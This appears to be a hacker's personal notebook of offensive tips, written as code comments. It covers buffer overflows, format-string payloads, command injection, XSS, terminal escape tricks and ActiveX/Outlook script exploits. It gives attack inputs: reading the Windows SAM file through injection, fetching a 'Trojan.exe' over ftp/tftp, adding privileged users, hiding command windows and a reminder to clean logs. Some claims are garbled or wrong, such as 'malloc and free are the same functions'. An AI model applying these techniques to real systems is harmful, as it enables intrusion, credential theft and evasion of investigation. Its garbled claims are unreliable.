// 	Hi guys I used that file to store here who knows smething like.. 
//	interesting info.   !!! Vulnerabilities of programm software. !!

/*

[	Tips	]

	Common: 
	- 	Check the send list bugtrac to know new bugs in programs.
	- 	Check program which have posibibliti and have access to system area.
	- 	Used configuration file of hacker for privileged programms 
		to get more privileges.
	- 	Use\Check Global system variables if the dest. program used them. 
		('like Enivremnt variable PATH, LD_LABRARY_PATH')
	-	Direct access to executable files from web-servers. e.g. perl.exe,
		perl.dll, bin/sh and others. To search such files use Google, AltaVista
	-	functional posibility in different parts of OS.
	-	Very useful tool todo investiagtion by whitebox method is IDA-Pro and 
	-	Hardware Virus is vey usefull it often placed into EPPROM memory of the Pc. 
	some programs on cigital.com
	-	Default settings in different programs could give a lot of possibilities
	to hack. (e.g. PHP - global variables).
	-	in some php programs data can be transfered to system areas as formated 
	string so can be used buffer overrun attack. 
	-	Free shares of session and user indentifiers may allow to change priviliges 
	by replacing session variable.
	-	Use different command coding.. to run the same command.
	-	Use another type symbol coding. like \/ or other you path behind program filters.
	Somtimes you may use it in UTF and Unicode converting.
	-	utf - 8 -> RFC-2044 to use hex encoded characters.
	-	You may use also alternative using of IP address coding.
	-	same IP addresses:
		http://msdn.microsoft.com
		http://207.46.239.122
		http://3475959674
	-	Union different attack types to get effrctive attack
	-	Sometimes injection Vector can include usefull preasure (code prepared by hacker)
	or you may point from injection vector to memory segment where that code stay.
	-	Sometimes addresse could be plaesed in diiferent order from right to left
	it deppends on system.
	-	instead of inserting code just code that you need in memory and run it.
	
		
	
	Win:		
	- 	boron in Thread Class on windows is information tag about user.
 	- 	http://technet.microsoft.com/en-us/sysinternals/default.aspx
		sysinternals for windows. filemon and regmon.
	- 	http://www.sysinternals.com
	-	nc like netcat but on Windows. 
	-	netstat -ano like netstat in Ulike.
	-	In windows when debugging programm search next functions.
		WSAend()	fwrite()	fread()		WSARecv()
	-	If you send to Microsoft WEb server string like ::$data it would read
	only 3 last letters. You may use it to run malicious programm on server.
	
	
	Ulike:
	- 	netcat program to create unvisisble client on Ulike platforms.
	-	ltrace same as Truss but on Ulike systems.
	-	check system to local socekt request netstat -an. also lsof
	-	whin using PATH variable system could use ls commmabd which can be replaced
	by hacker.
	
	Solaris:
	-	Truss is a programm to handle internall requests to libraries in SOLARIS

	Informix:
	-	http://<atacked host>/ifx/?LO=../../../etc/
	
	by Olko: 
	- 	Create script which will create md5 sums of system files and 
		store that files in specified directory. 	
	-	Create script which coppies log files into other directory.
	-	Creating white lists is more usefull than creating black lists.
	-	If investigation system realy complex you should partiotion it into
	small pieces.
	-	Use prorgramm segmments in which data from user is processing and this 
	segment is not secured. 
	-	To define which exe format  used you may use Dr.Web for that.


[	IDS - Interrupt detection systems	]

1.	There is two systems for interrupt detection:
	-	based on signature detection.
	-	Based on abnormal approach of programs.
	


[	Buffer overflow attack	]

	-	Hacker could change data in file (for Example in mp3 file) and then 
	programm read that data and put it into memmory.
	-	For Netscape Communicator there is a bug connected with font highness.
	-	exim has also a bug connected with buffer overflow when you put into 
	:include: parameter (in file .forward) too big value 
	-	Sometimes symbolic link gives you a full access to file.
	-	Another type of attack could be performed during mime coding/decoding.
	-	Use searching of the fixed length values of the programm(string, float numbers.)
	dont forget also about converting decimal into floating numbers errors. 
	-	We should find mimnimal excess of the allowed buffer size.
	-	next functions doesn't write NULL character at the end:
		fread()
		read()
		readv()
		pread()
		memcpy()
		memccpy()
		bcopy()
		gethostname()
		strncat()
	-	To Attack on other programs you may use functions with Null symbol writing.
	in that case that sy,bol could rewrite data in stack segment. Then function
	pop's wrong data pointer and give to IP register hacker command address. 
	-	You may also use stahck buffer overflow to rewrite address of the Exception
	code pointer which alocated at the end of stack segment. Then hacker may compromice 
	Exception situation in code to run his code. 
	-	Use Arifmetic errors of the memory calculations. 
	-	Experienced hackers used numebrs near the most boggest values of the 
	binary numbers (e.g 0xffffffff 0x00000000 signed 0x7ffffffff 0x800000000).
	you may use different arithmetic operations to get very big number value.
	to get problem like this you should look for:
	 	sub ecx, eax
	 	sub ecx, 1 
	-	Regular expression to find code with comparision j[gl]
	-	Regulat expression to find srithmetic operations.
	-	When you used %n format specificator after some data it set varibale which
	address pasted after format string. e.g. 
			int my_var
			printf("AAAAA%n ", &my_var) in my_var would be 5	
	-	Format string %08x let us to output double word from stack.  	
	-	If you Use "%s" format string you may read any address of the Stack. e.g.
			"AAAAA\x70\xF5\xF7\x77%08x....._%s_" will output
			AAAAA......._dfkmdfklgmdlkmdoer03i 90f9034tj_ it would be our string.
	Also you may use another variant. Instead of %s use %n and it input number of
	input in specified address. (see above).
	-	Use %u with %n to change number of output symbols. and in that way put data 
	huch requrieed by us or hacker. But beetwen data which means address inseert data
	like \x42\x42\x42\x42 (any data).
	-	There is a lot of attacks by using Heap. (use ntdll to get these functions)
	-	'malloc' and 'free' is the same functions. 
	-	To Hack C++ prgrmas use Vtable and replace Vtable values to addresses
	which points to hacker functions.
	-	to get current EIP  register use next asm code
		start : 
			jmp RELOC3
		RELOC2:
			pop	edi
			jmp AFTER_RELOC
		RELOC3:
			call RELOC2
		AFTER_RELOC:
	In this case we get code withotu Null symbols.
	-	NULL symbols shouldn't be used in Hacker prepared data.
	-	Sometimes we could hardcode function adresses calls to archive our code.
	-	use controll summs to fidn functions which you need.
	-	some times you may use multiplatform code. To use that Create jmp construction
	for one platform (that interprets code on other platform without doing damage). 
 	here would be vulnerable code for current platform. And for another platform 
 	just put vulnerable code after lmp code for current platform.
 	-	
	
[	Rootkits by yourself	]
	
	-	HKLM\SOFTWARE\Microsoft\Windiws NT\CurrentVersion\NetworkCards - use to
	get network cards on windows.
	-	PIC(programmable interrupt controller) used to repprogramm hardware interrupts
	into programm interrupts. That's why whrn we want to asl IRQ 1 it wont be 
	keyboard inerrupt. ))))instead of it windows used (IRQ 0-15) -> (0x30-0x3f)
	


[	Tracing vulnerability place of programm		]

	-	It is nice practice to trac dll  libraries to get broken functions. 
	BEcause by using this functions you can execute youe code from many applications.
	[	steps	Back tracing	]
		1.	Get vulnerable place of programm - write small program which can test 
		function in library. Also write /get programm which produce different 
		argumnets to functiona and save	results of functioning. Grab arguments which
		involves program in bad habbit (read file, etc.)
		2.	Then test is the bad data (which grabbed in 1.) goes into unsecured place
		of programm.
			-	There is 3 or more stages of bad data path. 
				1.	Input data - where data inputs into programm
				2.	Filter data - where data could br filtered.
				3.	Vulnarbilit part - Where data do it harm/dark work.
		3.	Check the data incoming part of the programm. 
	
	[	steps for direct tracing	]
		1.	check all start points.
		2.	check if code goes to the big segment
	
	[	tracing during programm running	]
		1.	Use code coverage tools. 
		2.	Use speed braks to go to the code where user data is used.
		3.	Use debuggers which allows you to stop programms at data reading
		from memory/buffer procedure (it calls leapfrogging). OllDbg best choice.
		4.	Also nice idea to improve analyzing is to use "find by patern" method		
		(aka boron tagging). desc: when you use leapfrogging by using current method
		programm looks in all memory segment stored in PC registers for a search string.
		If it find it, that segment would be user data segment.
		5.	It usefull to find test reg,reg operations because it could be analyzing 
		of Null ending of the string.

[	Analyzing     ]

1.	...
	-	Use grafical representaion of analyzed data to se bahavior and limits of
	random values (e.g use grafs and OpenGL representation.). and other static
	analyzing.


[   Server hacks    ]

1.	Including commands for oprating system inyterpretter. e.g. cmd, /bin/sh others. 
	-	use next API realisatins system() exec() open()
	-	use commands like cat and ping to determine different Oses. 
	-	use ftp to allow load from any ftp address. 
	-	To hide cmsd screen use following programm http://homepage.ntlworld.com/chawmp/elitewrap/
	also to hide any command runing use next script example: 
	start "window name" /MIN cmd.exe /c <commands>
	-	injection into web forms malicious code. e.g cat C:\winnt\repair\sam
	-	symbols to split commands in different Oses:
	%0a  	>   	'		;		|		>/dev/null 2>&1 |
	
	-	!!!!!!!!!!!!!!! 	DO NOT FORGET TO CLEAN LOGS		!!!!!!!!!!!!!!
	
	-	Return carriage symbol could be very usefull when pasting command to
	interpretter.
	-	Double preEscape function (use escape symbols to hide from analyzing 
	systems preEscape as mauch as you need)
	-	use > to redirect output and add it into file previous data will be deleted.
	also use >> to add string to file from any program e.g echo "some text"
	-	use debug under Windows to create executable files of com format. You 
	should use .src files : 
	debug.exe < somescript.src
	-	to check can you write or not write on file system use touch command.
	-	Under windows log files ussualy stored in WINNT\system32\Logfiels.
	-	if user can write file e.g. echo >> ... then it could delete it. 
	-	ftp.exe -s:ftp.txt <IP Address>, ftp.txt script for ftp client. Also 
	user may use tftp program to download malicious code. e.g "Trojan.exe"
	-	use diffrent commands to add privileged users to Oper. system. in win:
	net.exe ....
	-	use at commands at both systems to run commands in defined time. 

2.	Hacking by using local sockets files. and other things like pipes. 
	-	Sometimes Parent processes add privileges to child processes so 
	it canbe usful to get a permission of parent process.
	-	In ACL ccounts could be the same functionality. 
	-	Sometimes hacker can path into function not usual parameters. which can 
	damage another files for e.g. You use username as path to log file. If User 
	add ../../../ He can access to high level directory in File System. To Delete
	added string on server you should use NULL symbol in different kind via 
	escape Symbols and others.	 

3.	Hacking by using client programs vulnerabilities (terminals, browsers and other).
	-	Hack by using terminal escape codes of the termianl.
	-	There is a special symbols in telephone systems. which allows you to 
	go thru international gateways. like signal with frequesncy of 2600 Hz. 
	-	Sometimes you can send or receive file by using terminal commands. For Example:
	pattern for sending:	ESC{T<filename>CR	
	pattern for receiving:	ESC{R<filename>CR		
	-	Programm netterm could also execute som commands from sended messages.
	-	Printers by HP company used interesting method to control. They used their own 
	language called PCL. to Use them there is site about that with location:
	-	Adding symbols into keyboard buffer 
	e.g on Linux: 
	perl -e 'print "\x9E\x9bc"'
	echo -e "\033\132"
	to send commands to another linux shell use next commands:
	echo -e '\033\132' >> dev/ttyXX
	to hide symbols output them in black color use '[30m ' command code
	e.g. : echo -e "\033 [30m \033 \132"
	-	Using XSS technology to include malicious code into site. By using as input
	data in forms text like: "<script>...</script>" we can send interested info to our
	server.U can addd this into very sifferent part of web page and not only. 
	-	You may use &lt $gt $amp instead of standard tags.
	-	Also id server checks HTTP headers for example, you may use it fotr investigation.
	-	Check parameters og URL request.
	-	You MAy use the Client script to get access to client information. Often they 
	get's Shell uinterpretter object to run different commands. 
	Wscript.Shell	Host() function.   e.g:
	
	Myobj = new ActiveXObject("WScript.Shell");
	Myobj.Run("C:\\WINNT\\SYSTEM32\\CMD.EXE /C DIR C:\\ //A /P /S")
	
	Scripting.FileSystemObject - used to create different files on local file system.
	WScript.Network - used to mount network drives.
	Scriptlet.Typelib - used to hiddenly create files on local machine.s
	-	Use preloader posibility of IE to read crirtical files. 
	-	Use GetObject() function to get files also e.g
	DD = GetObject("c:\\boot.ini","htmlfile");  to get access to that file use:
	DD.body.innerText. 	Such  problems also has next Object ixsso.query e.g
	
	nn = ActiveXObject("ixsso.query");
	nn.Catalog="System";
	nn.query='@filename = *.pwl';
	-	Meta symbols in Messaga headers (message: sms, E-mail, other)
	-	Lot Ee-mali programs used html code in their email messages you
	may use script to include code into messages. especialy in FROM and TO headers.
	-	Outlook runs html page when you turn on reply or forward message.
	-	There is usefull object in outlook Application:
	NN = MySession.Session.Application.CreateObject("WScript.Shell");
	NN.Run(...);   				Also you may use VB for Applicaions:
	Set myApp = CreateObject("Outlook.Application");
	myApp.CreateObject("WScript.Shell");
	-	Object called view control used to hack Outlook also see below into code:
	<object id="view_control" classid="clsid:0006F063-0000-0000-C000-000000000046">
		<param name="folder" value="inbox">
	</object>
	
	<script>
	function myFunc() {
		mySelection = o1.object.selection;
		myItem = mySelectio.Item(1);
		mySession = myItem.Session.Application.CreateObject("WScript.Shell");
		mySession.Run("...");
	}
	
	setTimeout("myfunc()", 1000);
	</script>
	
	-	There is a lot types of attacks where atack program was hidden in attached documents. 
	-	downloader behavior in IE is realy different.

[	Investigations  ]

1. 	Investigate input data flow in programm.
2. 	Use list of bug fixes to know vulnerabilities of previous versions of code.
3. 	Windows has it's own debugger which can be used. Use type DEBUG_EVENT
4. 	There is a lot of system processes to debug anty programm and process in Win.
5. 	There are also two methods of investigation:
	-	from inside to outside where hacker looking into code to find
	function which wrote into outer file. 
	-	from putside to inside where hacker look into code to find
	outer data passed to programm and when and where prohram begin to
	work with that data.
	
6.	For black box investigation we should use ISICS, protos, Spike

Grey method - Purify.
Valgrind free under linux


[	Old ethernet bug	]

Bad ethernet functionality:
 in old ethernet cards there was vulnarability with packet. 
 in all packet (size of ethernet paket = 66 bytes there was data less than 66 bytes.)
 so Ethernet adapters sent also data from previous packet to fill packet size.
